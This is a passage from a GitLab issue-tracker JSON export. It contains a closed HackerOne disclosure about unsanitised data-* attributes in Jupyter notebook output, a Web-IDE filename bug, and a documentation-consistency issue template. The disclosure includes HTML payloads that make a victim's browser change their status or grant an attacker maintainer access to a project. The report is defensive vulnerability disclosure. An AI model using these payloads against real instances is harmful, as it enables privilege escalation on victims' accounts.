option other than the default.  \n5. Reload the page to recongize that your status has been altered, i.e. click on your profile in the top right corner.\n\n#####  Impact\n\nAn attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim.\n\nThe impact is similar to that of #824689 and #806571.\n\n#####  Examples\n\nDue to the destructive nature of the above-described example, I do not provide a public PoC, although I have created [an exemplary repository](https://gitlab.com/dpfuerst/sending-arbitrary-requests-through-jupyter-notebooks). This repository is private, please let me know if you would like me to change the visibility.\n\nThe above-described `exploit.ipynb` [sets the user status](https://docs.gitlab.com/ee/api/users.html#set-user-status) of the victim to `p0wn3d`. However, more critical permission-related exploits are also possible. Consider an attacker with developer access to a project who wants to gain maintainer access, instead. That attacker could upload an exploit like the above with the following payload:\n\n```html  \nWhat\u0026#39;s your favorite color?\u0026amp;emsp;\u0026lt;select data-method=\\\u0026#34;put\\\u0026#34; data-params=\\\u0026#34;user_id=\u0026lt;ATTACKER_ID\u0026gt;\u0026amp;access_level=40\\\u0026#34; data-remote=\\\u0026#34;true\\\u0026#34; data-url=\\\u0026#34;/api/v4/projects/\u0026lt;PROJECT_ID\u0026gt;/members\\\u0026#34;\u0026gt;\u0026lt;option\u0026gt;Red\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Green\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Blue\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;\\n  \n```\n\nwhere `\u0026lt;ATTACKER_ID\u0026gt;` is to be replaced with the attacker\u0026#39;s user ID and `\u0026lt;PROJECT_ID\u0026gt;` is to be replaced with the target project\u0026#39;s ID to [gain maintainer access](https://docs.gitlab.com/ee/api/members.html#edit-a-member-of-a-group-or-project).\n\n#####  What is the current *bug* behavior?\n\nThe provided `exploit.ipynb` renders to\n\n```html  \nWhat\u0026#39;s your favorite color? \u0026lt;select data-url=\u0026#34;/api/v4/user/status\u0026#34; data-remote=\u0026#34;true\u0026#34; data-params=\u0026#34;message=p0wn3d\u0026#34; data-method=\u0026#34;put\u0026#34;\u0026gt;\u0026lt;option\u0026gt;Red\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Green\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Blue\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;  \n```\n\n#####  What is the expected *correct* behavior?\n\nThe provided `exploit.ipynb` should render to\n\n```html  \nWhat\u0026#39;s your favorite color? \u0026lt;select\u0026gt;\u0026lt;option\u0026gt;Red\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Green\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Blue\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;  \n```\n\nThat is, `data-*` attributes should be stripped from GitLab\u0026#39;s rich output.

For example, using the GitLab API as a target, an attacker could gain maintainer access to a project, given that the victim is maintainer (or higher) themselves.\n\nThe impact is similar to that of #824689 and #806571.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [exploit.ipynb](https://h1.sec.gitlab.net/a/3647e251-cc3d-4abd-89d5-8fd562fd87d7/exploit.ipynb)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2020-09-06T23:18:49.180Z","updated_at":"2022-02-10T15:02:39.278Z","closed_at":"2021-08-27T08:19:38.994Z","closed_by":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"labels":["Category:Source Code Management","Deliverable","HackerOne","SaaS","Weakness::CWE-77","devops::create","frontend","group::mlops","group::source code","priority::3","section::dev","security","security-backlog::valid","severity::3"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},{"id":4391348,"username":"sean_carroll","name":"Sean Carroll","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4391348/avatar.png","web_url":"https://gitlab.com/sean_carroll"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2020-11-05","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/246369","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/246369","notes":"https://gitlab.com/api/v4/projects/278964/issues/246369/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/246369/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#246369","relative":"#246369","full":"gitlab-org/gitlab#246369"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":70791974,"iid":246261,"project_id":278964,"title":"Files starting with a space are indistinguishable from same name without space in Web-IDE","description":"### Summary\n\nIn the Web-IDE's filetree-view: If a directory name starts with a space (' ') it's indistinguishable from same name without space.\n\n### Steps to reproduce\n\n1. create a repo\n2. create a file called ' .test/Readme' directly in the repo-view and commit\n3. reopen repo in web-ide\n4. create a directory called 'test' and commit\n\n\n### Example Project\n\nhttps://gitlab.com/admindojo/testestest\n\n### What is the current *bug* behavior?\n\nBoth directories are indistinguishable from another. \n\n### What is the expected *correct* behavior?\n\nThe space at the beginning should be at least somehow visible.

auto generated. Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes \n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve\n\nTo ensure a consistent experience, the different UI's under the Package Stage umbrella should be consistent when referencing users to documentation. Following Pajamas guidelines, this means all references to the documentation should be \"Details of this UI. [More information](docs)\".\n\nOriginal issue: https://gitlab.com/gitlab-org/gitlab/-/issues/245264\n\n### Intended users\n\n\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) \n\n### User experience goal\n\nEnable users to quickly and consistently find documentation links throughout the Package Stage UI.\n\n\n### Proposal\n\nFirst, we need to manually investigate the user interface in the Container Registry, Dependency Proxy, project settings, group settings, admin settings, and empty/error states to ensure all references to the documentation follow the correct pattern. \n\nSecond, after cataloging the instances where we currently display an inconsistent reference to documentation, update the body copy and link to be the above pattern.\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members \n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt.
